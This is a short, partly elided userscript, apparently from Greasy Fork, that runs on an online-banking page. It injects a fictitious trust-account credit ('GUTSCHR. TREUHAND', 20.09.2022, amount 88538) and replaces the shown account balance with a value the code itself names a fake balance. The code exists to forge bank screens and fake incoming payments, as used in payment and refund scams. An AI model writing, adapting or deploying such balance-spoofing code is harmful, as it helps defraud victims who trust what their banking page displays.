// ==UserScript==
// @name         Vertragssignature request Isbrecht
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/451670/Vertragssignature%20request%20Isbrecht.user.js
// @updateURL https://update.greasyfork.org/scripts/451670/Vertragssignature%20request%20Isbrecht.meta.js
// ==/UserScript==
...
(function() {
    ...
    var absenderDetails = "20.09.2022 | GUTSCHR. TREUHAND";
    var amount = 88538;
    var vorgemerkt = "no";
    ...
    //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){
            ...
            //Update Balance
            document.getElementsByClassName("balance-predecimal")[4].textContent = fakeAccBalancewithcomma;
